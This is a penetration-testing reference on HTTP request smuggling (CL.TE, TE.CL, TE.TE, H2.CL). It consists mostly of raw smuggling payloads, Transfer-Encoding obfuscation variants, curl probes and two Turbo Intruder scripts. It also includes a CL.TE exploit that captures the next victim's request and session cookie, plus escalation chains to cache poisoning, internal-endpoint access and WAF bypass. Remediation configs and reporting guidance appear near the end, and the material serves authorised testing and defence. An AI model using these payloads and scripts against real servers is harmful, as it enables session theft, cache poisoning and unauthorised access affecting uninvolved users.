# HTTP Request Smuggling (HTTP Desync) — Vulnerability Class Reference

> Complete detection, validation, and exploitation reference for HTTP Request Smuggling (HTTP Desync).
> CWE-444: Inconsistent Interpretation of HTTP Requests (HTTP Request Smuggling).
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Browser validation NOT applicable — server-side vulnerability.
> Use Turbo Intruder / custom scripts for timing-based confirmation.

---

## Root Cause

HTTP Request Smuggling occurs when a front-end server (proxy, load balancer, CDN, WAF) and a back-end server interpret HTTP request boundaries differently due to conflicting `Content-Length` and `Transfer-Encoding` headers.

```http
# VULNERABLE: Conflicting headers cause boundary confusion
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Root cause**: Front-end uses one header to determine request length, back-end uses the other. The discrepancy allows an attacker to "smuggle" a partial request that the back-end treats as the start of the next request.

---

## Variants

| Variant | Front-end | Back-end | Description |
|---------|-----------|----------|-------------|
| **CL.TE** | Content-Length | Transfer-Encoding | Front-end sees CL, back-end sees TE. Most common. |
| **TE.CL** | Transfer-Encoding | Content-Length | Front-end sees TE, back-end sees CL. |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | Both support TE, but one obfuscates to bypass. |
| **H2.CL** | HTTP/2 | Content-Length | HTTP/2 front-end (no CL) + CL injection → back-end desync. |
| **H2.TE** | HTTP/2 | Transfer-Encoding | HTTP/2 front-end + TE obfuscation. |

---

## Testing Checklist (via Caido + Turbo Intruder)

### Phase 1: Discovery (Safe Probing)

```bash
# 1. Identify potential targets
# Look for: reverse proxies, load balancers, CDNs, WAFs
# Headers to check: Server, Via, X-Cache, CF-Ray, X-Akamai, etc.

curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/" | \
  grep -iE 'server:|via:|x-cache:|cf-ray:|x-amz-cf-id:|x-amzn-trace-id:'
```

### Phase 2: CL.TE Detection (Most Common)

```bash
# CL.TE Probe: Valid CL + malformed TE (incomplete chunk)
# Front-end uses CL, back-end waits for chunk completion

cat > clte_probe.txt << 'EOF'
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
EOF

# Send via Caido/Turbo Intruder and measure response time
# Baseline: normal request ~100-500ms
# CL.TE positive: response delayed 5-30+ seconds (back-end waiting for chunk)
```

### Phase 3: TE.CL Detection

```bash
# TE.CL Probe: Valid TE + malformed CL
# Front-end uses TE, back-end uses CL

cat > tecl_probe.txt << 'EOF'
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

EOF
```

### Phase 4: TE.TE Detection (Obfuscation)

```bash
# TE.TE: Both support TE, obfuscate to disable one
# Obfuscation techniques:

# 1. Case variation
Transfer-Encoding: ChUnKeD

# 2. Whitespace
Transfer-Encoding: chunked
Transfer-Encoding: chunked

# 3. Header splitting
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

# 4. Tab/space prefix
	Transfer-Encoding: chunked
 Transfer-Encoding: chunked

# 5. Empty value
Transfer-Encoding:
 Transfer-Encoding: chunked

# 6. Duplicate with different case
Transfer-Encoding: chunked
transfer-encoding: chunked
```

### Phase 5: H2.CL Detection (HTTP/2 Front-end)

```bash
# HTTP/2 front-end ignores Content-Length (uses pseudo-headers)
# Back-end uses Content-Length → desync

# Use curl with --http2 and manual CL
curl -x "http://localhost:8080" --http2 -i \
  -H "Content-Length: 100" \
  -d "smuggled_data_here" \
  "https://target.com/"

# Or use h2c (HTTP/2 cleartext) if available
```

### Phase 6: Turbo Intruder Automation (Critical for Timing)

```python
# Turbo Intruder script for CL.TE
# Copy into Turbo Intruder (Burp extension)

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    
    # Baseline request
    baseline = target.req
    
    # CL.TE probe with varying delays
    for delay in [0, 1, 2, 5, 10, 20, 30]:
        probe = target.req.replace(
            "POST / HTTP/1.1",
            f"POST / HTTP/1.1\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
        )
        engine.queue(probe, delay=delay)
    
    # Also test TE.CL
    for delay in [0, 1, 2, 5, 10, 20, 30]:
        probe = target.req.replace(
            "POST / HTTP/1.1",
            f"POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
        )
        engine.queue(probe, delay=delay)

def handleResponse(req, interesting):
    if req.time > 5:  # Response delayed >5 seconds = potential desync
        table.add(req)
```

### Phase 7: Confirmation & Exploitation

```bash
# Once desync confirmed, craft exploit:

# 1. Request smuggling → steal victim's request
# Smuggle prefix that captures next user's request

# CL.TE exploit: steal session cookie
POST / HTTP/1.1
Host: target.com
Content-Length: 72
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
Foo: bar

# Next victim's request gets appended:
# GET /account HTTP/1.1
# Cookie: session=VICTIM_SESSION
# ...
# Result: attacker sees victim's request in response

# 2. Cache poisoning via desync
# Smuggle request that poisons cache

# 3. Bypass front-end restrictions
# Smuggle request to internal/admin endpoint
```

---

## Advanced Detection Techniques

### 1. Differential Testing (HTTP/1.1 vs HTTP/2)

```bash
# Test same endpoint over HTTP/1.1 and HTTP/2
# Desync may only exist on one protocol

for proto in --http1.1 --http2; do
  echo "Testing $proto"
  curl -x "http://localhost:8080" $proto -sS -D - -o /dev/null \
    -H "Content-Length: 13" \
    -H "Transfer-Encoding: chunked" \
    --data-binary $'0\r\n\r\nSMUGGLED' \
    "https://target.com/" | grep -E "HTTP|time"
done
```

### 2. Differential Response Analysis

```bash
# Compare response headers/body between baseline and probe
# Look for:
# - Different status codes
# - Different response bodies
# - Different headers (especially Set-Cookie, Location)
# - Connection closure differences

BASELINE=$(curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/")
PROBE=$(curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Length: 13" -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nSMUGGLED' "https://target.com/")

diff <(echo "$BASELINE") <(echo "$PROBE")
```

### 3. Connection Reuse Testing

```bash
# Test if smuggled request affects subsequent requests on same connection
# Use HTTP/1.1 keep-alive

# 1. Send smuggling request
# 2. Immediately send normal request on same connection
# 3. Check if normal request gets smuggled prefix

# Use Turbo Intruder with single connection
```

### 4. Port/Endpoint Enumeration

```bash
# Test multiple endpoints and ports
PORTS="80 443 8080 8443 8000 8080 8888 9000"
ENDPOINTS="/ /api /admin /login /graphql"

for port in $PORTS; do
  for ep in $ENDPOINTS; do
    echo "Testing :$port$ep"
    # Run CL.TE probe
  done
done
```

---

## Turbo Intruder Complete Script

```python
# Full Turbo Intruder script for comprehensive desync testing
# Save as desync_test.py and load in Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False,
        maxRetriesPerRequest=0
    )
    
    # Store baseline
    baseline = target.req
    
    # ===== CL.TE PROBES =====
    # Standard CL.TE
    clte_payload = b"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
    engine.queue(clte_payload)
    
    # CL.TE with different paths
    for path in ["/", "/api", "/admin", "/login", "/graphql", "/api/v1"]:
        payload = f"POST {path} HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED".encode()
        engine.queue(payload)
    
    # ===== TE.CL PROBES =====
    tecl_payload = b"POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
    engine.queue(tecl_payload)
    
    # ===== TE.TE Obfuscation =====
    obfuscations = [
        b"Transfer-Encoding: ChUnKeD\r\n",
        b"Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n",
        b"Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n",
        b"\tTransfer-Encoding: chunked\r\n",
        b" Transfer-Encoding: chunked\r\n",
        b"Transfer-Encoding:\r\n Transfer-Encoding: chunked\r\n",
    ]
    
    for obf in obfuscations:
        payload = b"POST / HTTP/1.1\r\nHost: target.com\r\n" + obf + b"\r\n0\r\n\r\nSMUGGLED"
        engine.queue(payload)
    
    # ===== H2.CL =====
    # Requires HTTP/2 - test separately with curl --http2
    
    # ===== Timing Probes =====
    # Send with increasing delays to detect back-end timeout
    for delay in [0, 1, 2, 3, 5, 10, 15, 20, 30, 60]:
        payload = f"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED_{delay}".encode()
        engine.queue(payload, delay=delay)

def handleResponse(req, interesting):
    # Flag responses with unusual timing
    if req.time > 5000:  # >5 seconds
        table.add(req, "TIMING_ANOMALY")
    if "SMUGGLED" in req.response and req.response.count("SMUGGLED") > 1:
        table.add(req, "MULTIPLE_SMUGGLED")
    if req.status != 200 and req.status != 404:
        table.add(req, f"STATUS_{req.status}")
```

---

## Confirmation Criteria

### Positive Confirmation (All Required)

1. **Timing Anomaly**: Response delayed >5 seconds vs baseline (<500ms)
2. **Reproducibility**: Same delay on 2+ consecutive runs
3. **Differential**: Baseline fast, probe slow, control fast
4. **No WAF Interference**: Not a WAF timeout page (check response body)

### Evidence Collection

```bash
# Save evidence
mkdir -p evidence/desync

# Baseline
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/" > evidence/desync/baseline.txt

# Probe
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Length: 13" -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nSMUGGLED' "https://target.com/" > evidence/desync/probe.txt

# Diff
diff evidence/desync/baseline.txt evidence/desync/probe.txt > evidence/desync/diff.txt
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| Desync → Request capture | Steal victim's request (cookies, tokens) | Critical |
| Desync → Cache poisoning | Poison cache for all users | Critical |
| Desync → Internal access | Reach internal/admin endpoints | Critical |
| Desync → Cache poisoning + XSS | Stored XSS via cache | Critical |
| Desync → Bypass WAF | Smuggle past front-end rules | High |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Verification |
|-------------|-------------------|--------------|
| Single slow response | Network latency, server load | Reproduce 3x, baseline control |
| WAF timeout page | WAF blocking, not desync | Check response body for WAF markers |
| Server error (500) | App error, not desync | Check if reproducible without smuggling |
| Connection timeout | Network/firewall | Test direct to origin |
| Single reproduction | Flaky network | Must reproduce 3/3 times |

---

## Remediation

```nginx
# Nginx: Reject requests with both CL and TE
if ($http_transfer_encoding = "chunked") {
    return 400;
}

# Or: Force use of Content-Length
proxy_set_header Content-Length "";
proxy_set_header Transfer-Encoding "";

# Apache: 
RequestHeader unset Transfer-Encoding

# HAProxy:
http-request deny if { req.hdr(Transfer-Encoding) -m found chunked }
```

---

## Quick Reference

### Key Payloads (via Caido/Turbo Intruder)

```bash
# CL.TE (most common)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

# TE.TE obfuscation
Transfer-Encoding: ChUnKeD
Transfer-Encoding: chunked

# H2.CL (curl --http2)
Content-Length: 100
```

### Detection Tools

| Tool | Purpose |
|------|---------|
| Turbo Intruder (Burp) | Timing-based desync detection |
| smuggler (Burp extension) | Automated probe sending |
| HTTP Request Smuggler (Burp) | CL.TE/TE.CL/TE.TE/H2.CL |
| curl --http1.1/--http2 | Protocol differential |
| smuggler.py (standalone) | CLI testing |

### Key Headers to Check

| Header | Significance |
|--------|--------------|
| `Server: nginx` + `Via:` | Potential front-end/back-end |
| `X-Cache: HIT/MISS` | Cache layer present |
| `CF-Ray` | Cloudflare (known desync behaviors) |
| `Via: 1.1 google` | Google Cloud Load Balancer |
| `X-Amz-Cf-Id` | CloudFront |

---

## Reporting

### Title
```
HTTP Request Smuggling (CL.TE) Allows Request Capture and Cache Poisoning
```

### Evidence Required
1. Baseline request/response (fast)
2. Probe request/response (delayed >5s)
3. Reproducibility (3/3 runs)
4. Differential analysis (baseline vs probe)
5. Turbo Intruder timing logs
6. Exploit demonstration (request capture/cache poisoning)

### Severity
| Level | Criteria |
|-------|----------|
| **Critical** | Request capture, cache poisoning, internal access |
| **High** | Request smuggling with limited impact |
| **Medium** | Desync confirmed but no exploitation path |
| **Low** | Theoretical only, no reproduction |

### Remediation

```nginx
# Nginx: Drop requests with both CL and TE
map $http_transfer_encoding $te_chunked {
    default 0;
    "chunked" 1;
}

server {
    if ($te_chunked) {
        return 400 "Transfer-Encoding: chunked not allowed";
    }
}
```

---

## Caido Integration

```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...
# Turbo Intruder: configure upstream proxy to http://localhost:8080
```

### Turbo Intruder → Caido Setup
1. In Turbo Intruder: `Request Engine` → `Proxy` → `http://localhost:8080`
2. All smuggled requests route through Caido for logging/analysis